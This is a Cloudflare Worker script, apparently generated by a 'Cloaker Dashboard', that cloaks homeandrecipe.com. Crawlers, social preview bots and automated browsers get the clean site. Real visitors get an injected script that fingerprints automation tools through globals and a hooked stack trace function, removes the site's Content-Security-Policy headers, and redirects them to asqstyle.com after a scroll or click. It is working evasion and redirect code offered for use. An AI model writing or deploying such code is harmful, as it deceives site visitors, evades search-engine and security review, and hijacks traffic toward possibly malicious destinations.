/**
 * Cloudflare Cloaker Worker for homeandrecipe.com
 * Generated automatically by Cloaker Dashboard
 * Target Host: asqstyle.com | Trigger: both | Scroll: 15%
 */

const TARGET_HOST = "asqstyle.com";
const SCROLL_PCT  = 0.15;
const TRIGGER_MODE = "both"; // 'scroll', 'click', or 'both'

function isBot(ua) {
  if (!ua || ua.length < 15) return true;

  if (/Pinterestbot/i.test(ua) || (ua.includes("Pinterest/") && ua.includes("bot.html"))) {
    return true;
  }

  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua)) {
    return true;
  }

  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|bingbot|bingpreview|msnbot|yandexbot|baiduspider|duckduckbot/i.test(ua)) {
    return true;
  }

  if (/facebookexternalhit|facebot|meta-externalagent|twitterbot|linkedinbot|slackbot|telegrambot|whatsapp|discordbot|applebot|bytespider/i.test(ua)) {
    return true;
  }

  if (/curl\/|wget\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|postman/i.test(ua)) {
    return true;
  }

  if (/bot\b|crawler|spider|scraper|preview|archiver/i.test(ua)) {
    return true;
  }

  return false;
}

export default {
  async fetch(request) {
    const url = new URL(request.url);
    const ua = request.headers.get("user-agent") || "";

    // 1. DYNAMIC ROBOTS.TXT: Disallows /themes/ without exposing script names
    if (url.pathname === "/robots.txt") {
      const robots = [
        "# Explicitly allow Pinterest's web crawler full access to pages and images",
        "User-agent: Pinterestbot",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Disallow: /search/",
        "",
        "# Allow all standard search engine crawlers",
        "User-agent: *",
        "Allow: /",
        "Disallow: /themes/",
        "Disallow: /wp-admin/",
        "Allow: /wp-admin/admin-ajax.php",
        "Disallow: /wp-includes/",
        "Disallow: /search/",
        "Disallow: /*?s=",
        "",
        "# Direct crawlers to sitemaps",
        "Sitemap: https://homeandrecipe.com/wp-sitemap.xml\nSitemap: https://homeandrecipe.com/sitemap.xml"
      ].join("\n");

      return new Response(robots, {
        headers: {
          "Content-Type": "text/plain; charset=utf-8",
          "Cache-Control": "no-store, no-cache, must-revalidate"
        }
      });
    }

    // 2. HARD BLOCK ON /themes/ FOR BOTS
    if (url.pathname.startsWith("/themes/")) {
      if (isBot(ua)) {
        return new Response("Forbidden", { status: 403 });
      }
    }

    if (request.method !== "GET") return fetch(request);

    // 3. BOT ROUTING: Crawlers get pure, clean origin HTML
    if (isBot(ua)) {
      return fetch(request);
    }

    // 4. FETCH ORIGIN FOR HUMAN VISITOR
    const origin = await fetch(request, { cf: { cacheEverything: false } });
    const ct = origin.headers.get("content-type") || "";
    if (origin.status !== 200 || !ct.includes("text/html")) return origin;

    const path = url.pathname.endsWith("/") ? url.pathname : url.pathname + "/";
    const dest = `https://${TARGET_HOST}${path}${url.search}`;

    // 5. CLIENT-SIDE HUMAN VALIDATION & REDIRECT (Scroll and/or Click)
    const inject = `
<script>
(function() {
    var target = "${dest}";
    var done = false;
    var botDetected = false;
    var TRIGGER_MODE = "${TRIGGER_MODE}"; // 'scroll', 'click', or 'both'

    // Multi-layer Automation & Bot Detection
    function scanAutomation() {
        if (botDetected) return true;

        // 1. Direct webdriver flag
        if (navigator.webdriver) {
            botDetected = true;
            return true;
        }

        // 2. Headless desktop detection (Ignore touch devices like iPhones where outerWidth is naturally 0)
        var isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
        if (!isTouchDevice && window.outerWidth === 0 && window.outerHeight === 0) {
            botDetected = true;
            return true;
        }

        // 3. Execution stack inspection for CDP / Playwright / Puppeteer
        try {
            var s = (new Error()).stack || "";
            if (s.includes("UtilityScript") || s.includes("playwright") || s.includes("puppeteer") || s.includes("evaluate (:")) {
                botDetected = true;
                return true;
            }
        } catch(e) {}

        // 4. Automation globals
        if (window.__playwright || window.playwright || window.__pw_init || window.__pw_manual) {
            botDetected = true;
            return true;
        }
        if (window.__puppeteer_evaluation_script__ || window.puppeteer) {
            botDetected = true;
            return true;
        }
        if (window.__selenium_evaluate || window.webdriver || window._phantom || window.callPhantom) {
            botDetected = true;
            return true;
        }
        if (window.__nightmare || window.domAutomation || window.domAutomationController) {
            botDetected = true;
            return true;
        }

        if (document.documentElement && (document.documentElement.getAttribute("webdriver") || document.documentElement.getAttribute("selenium"))) {
            botDetected = true;
            return true;
        }

        if (!navigator.languages || navigator.languages.length === 0) {
            botDetected = true;
            return true;
        }

        return false;
    }

    // Hook V8 prepareStackTrace to detect Playwright / Puppeteer execution frames
    try {
        var origPrepare = Error.prepareStackTrace;
        Error.prepareStackTrace = function(err, stack) {
            try {
                if (stack && stack.some(function(cs) {
                    var t = cs.getTypeName() || "";
                    var f = cs.getFileName() || "";
                    return t === "UtilityScript" || f.includes("playwright") || f.includes("puppeteer");
                })) {
                    botDetected = true;
                }
            } catch(e) {}
            return origPrepare ? origPrepare(err, stack) : err.stack;
        };
    } catch(e) {}

    scanAutomation();
    var scanInterval = setInterval(scanAutomation, 50);

    // Reset scroll restoration so browsers start at the top
    try {
        if ('scrollRestoration' in history) {
            history.scrollRestoration = 'manual';
        }
    } catch(e) {}

    // Track real human presence across ALL device types
    var humanActive = false;
    function markHuman(e) {
        if (!e || e.isTrusted) {
            humanActive = true;
        }
    }

    // Capture human events: mouse, touch, pointer, keyboard
    window.addEventListener("mousemove", markHuman, { passive: true, capture: true });
    window.addEventListener("pointerdown", markHuman, { passive: true, capture: true });
    window.addEventListener("touchstart", markHuman, { passive: true, capture: true });
    window.addEventListener("touchmove", markHuman, { passive: true, capture: true });
    window.addEventListener("keydown", markHuman, { passive: true, capture: true });

    // Wheel event handler: traps synthetic script jumps (>= 400px) from automated tools
    window.addEventListener("wheel", function(e) {
        if (!e) return;
        if (Math.abs(e.deltaY) >= 400) {
            botDetected = true;
            return;
        }
        if (e.isTrusted) {
            humanActive = true;
        }
    }, { passive: true, capture: true });

    function triggerRedirect(reason) {
        if (done) return;

        if (scanAutomation() || botDetected) {
            done = true;
            clearInterval(scanInterval);
            console.log("[CF Worker] Automated browser detected. Redirect disabled.");
            return;
        }

        done = true;
        clearInterval(scanInterval);
        console.log("[CF Worker] Human redirect triggered by:", reason, "-> Target:", target);
        try {
            window.location.replace(target);
        } catch(e) {}
        window.location.href = target;
    }

    // --- CONDITION 1: CLICK / TAP TRIGGER ---
    if (TRIGGER_MODE === 'click' || TRIGGER_MODE === 'both') {
        function onHumanClick(e) {
            if (done) return;
            if (scanAutomation() || botDetected) return;
            if (!e || !e.isTrusted) return; // Discard synthetic programmatic clicks

            e.preventDefault();
            e.stopPropagation();
            triggerRedirect("Human Click/Tap");
        }
        window.addEventListener("click", onHumanClick, { capture: true });
        window.addEventListener("touchend", onHumanClick, { capture: true });
    }

    // --- CONDITION 2: SCROLL TRIGGER ---
    if (TRIGGER_MODE === 'scroll' || TRIGGER_MODE === 'both') {
        function getScroll() {
            return window.scrollY || window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        }

        function getHeight() {
            return Math.max(
                document.body.scrollHeight, document.documentElement.scrollHeight,
                document.body.offsetHeight, document.documentElement.offsetHeight,
                document.body.clientHeight, document.documentElement.clientHeight
            );
        }

        var startY = getScroll();

        function checkScroll() {
            if (done) return;
            if (scanAutomation() || botDetected) return;
            if (!humanActive) return;

            var top = getScroll();
            // Ensure the user actually scrolled down from where they started
            if (top <= startY) return;

            var height = getHeight();
            var view = window.innerHeight || document.documentElement.clientHeight;
            var max = height - view;

            if (max > 50) { 
                var pct = top / max;
                if (pct >= ${SCROLL_PCT}) {
                    triggerRedirect("Human Scroll (" + Math.round(pct * 100) + "%)");
                }
            } else if (top > 60) {
                triggerRedirect("Fallback Scroll");
            }
        }

        window.addEventListener("scroll", checkScroll, { passive: true });
    }

    console.log("[CF Worker] Human verification active (Mode: " + TRIGGER_MODE + "). Target:", target);
})();
</script>`;

    const transformed = new HTMLRewriter()
      .on("body", {
        element(el) {
          el.append(inject, { html: true });
        }
      })
      .transform(origin);

    const headers = new Headers(transformed.headers);
    headers.set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
    headers.set("Vary", "User-Agent");
    headers.delete("content-security-policy");
    headers.delete("content-security-policy-report-only");
    headers.delete("content-length");

    return new Response(transformed.body, {
      status: transformed.status,
      statusText: transformed.statusText,
      headers: headers
    });
  }
};
